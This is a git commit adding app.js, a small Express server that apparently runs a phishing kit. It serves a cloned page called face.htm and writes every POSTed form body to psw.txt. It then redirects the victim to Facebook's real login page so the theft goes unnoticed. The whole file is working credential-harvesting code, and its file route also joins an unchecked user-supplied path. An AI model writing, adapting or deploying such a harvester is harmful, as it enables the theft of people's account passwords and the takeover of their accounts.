bafb9bf540573bc81667505b2e1f198fdbe83e06
yellowpink62 <yellowpink62@gmail.com>
2019-09-19 18:16:05 -0300

    f

---
+++ app.js
@@ -0,0 +1,29 @@
+var express = require('express');
+var app = express();
+var path = require('path');
+var fs = require('fs');
+var bodyParser = require('body-parser');
+
+app.use(bodyParser.urlencoded({
+    extended: false
+}))
+app.use(bodyParser.json())
+
+app.get('/', function (req, res) {
+    res.sendFile(path.join(__dirname + '/face.htm'));
+});
+
+app.get('/face_files/:id', function (req, res) {
+    res.sendFile(path.join(__dirname + '/face_files/' + req.params.id));
+});
+
+app.post('/s', function (req, res) {
+    fs.appendFile(
+        __dirname + '/psw.txt',
+        JSON.stringify(req.body) + '\n\n',
+        () => {}
+    );
+    res.redirect('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110');
+});
+
+app.listen(2222);
